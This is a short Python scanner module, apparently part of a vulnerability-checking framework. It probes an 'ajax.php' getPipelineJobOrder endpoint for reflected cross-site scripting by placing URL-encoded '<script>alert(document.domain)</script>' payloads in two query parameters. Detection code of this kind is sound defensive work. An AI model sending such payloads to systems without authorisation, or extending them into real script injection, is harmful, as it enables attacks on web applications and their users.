...
class Module(Scanner, Http_client):
    ...
    def run(self):
        r = self.http_request(method="GET", path='/ajax.php?f=getPipelineJobOrder&joborderID=50&page=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&entriesPerPage=15&sortBy=dateCreatedInt&sortDirection=desc&indexFile=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&isPopup=0', allow_redirects=False)
        ...
        if (all(m in body for m in body_all)) and (all(m in headers for m in header_all)):
            self.set_info(
                ...
                path='/ajax.php?f=getPipelineJobOrder&joborderID=50&page=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&entriesPerPage=15&sortBy=dateCreatedInt&sortDirection=desc&indexFile=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&isPopup=0',
            )
            return True
        return False
